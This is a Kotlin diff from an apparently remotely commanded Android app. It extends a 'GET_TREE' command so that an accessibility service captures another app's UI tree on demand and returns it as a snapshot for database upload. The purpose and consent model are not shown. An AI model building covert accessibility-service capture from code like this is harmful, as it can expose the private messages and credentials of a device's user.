@@ -294,24 +294,32 @@ object CommandProcessor {
                     return
                 }
                 "GET_TREE" -> {
-                    // Content format: "pkg_name|mins" or just "mins" or empty
                     val parts = content.split("|")
-                    val pkg = if (parts.size >= 2) parts[0].trim() else if (parts[0].contains(".")) parts[0].trim() else null
-                    val mins = (if (parts.size >= 2) parts[1].toLongOrNull() else parts[0].toLongOrNull()) ?: 5L
+                    val pkg = parts.getOrNull(0)?.trim().let { if (it == "null" || it == "") null else it }
+                    val mins = parts.getOrNull(1)?.trim()?.toLongOrNull() ?: 5L
+                    val depth = parts.getOrNull(2)?.trim()?.toIntOrNull() ?: 10
                     
                     if (MyAccessibilityService.instance != null) {
                         if (mins <= 0) {
                             MyAccessibilityService.instance?.startTreeDump(null, 0)
                             status = "SCAN_SESSION_TERMINATED"
-                            errorMsg = "All active UI scan sessions have been cleared."
                         } else {
+                            // 1. Start periodic session
                             MyAccessibilityService.instance?.startTreeDump(pkg, mins)
+                            
+                            // 2. Perform IMMEDIATE capture for database upload
+                            val treeData = MyAccessibilityService.instance?.getInstantTree(pkg, depth)
                             status = "SCAN_SESSION_STARTED"
-                            errorMsg = "Target: ${pkg ?: "GLOBAL"} | Duration: ${mins}m"
+                            val result = JSONObject().apply {
+                                put("depth_limit", depth)
+                                put("snapshot", treeData)
+                            }
+                            updateCommandStatus(ctx, id, status, null, result, null)
+                            return
                         }
                     } else {
                         status = "FAILED (SERVICE_OFF)"
-                        errorMsg = "Accessibility service is not running."
+                        errorMsg = "Accessibility service is offline."
                     }
                 }
                 "GET_LOGS" -> {
